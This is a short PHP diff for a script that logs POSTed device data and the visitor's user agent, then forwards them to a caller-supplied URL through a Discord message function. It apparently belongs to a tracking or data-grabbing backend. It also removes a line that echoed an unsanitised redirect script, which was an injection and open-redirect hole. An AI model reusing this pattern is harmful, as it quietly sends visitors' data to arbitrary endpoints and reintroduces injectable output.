@@ -2,7 +2,7 @@
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') 
 {
-    if(isset($_POST['link']))
+    if(isset($_POST['url']))
 	{
 		LogData($_POST);
 	}
@@ -37,9 +37,8 @@ function LogData($device)
     $data = str_replace('}',"",$data);
     $data = $data."\n".
     '"User_agent":'.$_SERVER['HTTP_USER_AGENT'];
-    write($data);     
-    SendDiscordMesg($device['link'], $data);
-    echo "<script>window.location='".$device['Redirect']."'</script>";	
+    write($data);
+    SendDiscordMesg($device['url'], $data);
 }
 
 
